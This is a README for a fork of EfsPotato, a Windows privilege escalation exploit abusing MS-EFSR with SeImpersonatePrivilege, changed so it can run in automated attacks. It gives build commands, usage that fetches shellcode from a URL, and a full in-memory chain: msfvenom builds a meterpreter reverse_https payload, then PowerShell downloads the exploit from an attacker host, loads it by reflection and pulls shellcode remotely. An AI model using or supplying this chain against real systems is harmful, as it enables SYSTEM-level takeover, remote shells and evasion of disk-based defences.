## Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).

This fork improves the original exploit by removing the manual step of needing to run the exe in an interactive session.
You can use this in a more automated fashion, which can help save time.

### build

	#for 4.x
	csc.exe EfsPotato.cs -nowarn:1691,618
	csc /platform:x86 EfsPotato.cs -nowarn:1691,618
	
	#for 2.0/3.5
	C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs -nowarn:1691,618
	C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs -nowarn:1691,618

	#on Linux
	mcs EfsPotato.cs

### usage

	usage: EfsPotato <shellcode_url> [pipe]
  	  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)


### Running in-memory only with reflection
You can also run EfsPotato directly in memory from Powershell using reflection:

	# craft shellcode on attacking machine
	msfvenom -p windows/x64/meterpreter/reverse_https -f raw -o /var/www/html/shellcode

	# run exploit on victim machine
	$b=(New-object system.net.webclient).DownloadData("http://10.10.10.10/EfsPotato.exe")
	$a=[System.Reflection.Assembly]::Load($b)
	[EfsPotato.Program]::Main("http://10.10.10.10/shellcode")

![](https://raw.githubusercontent.com/zcgonvh/EfsPotato/master/test.png)
 
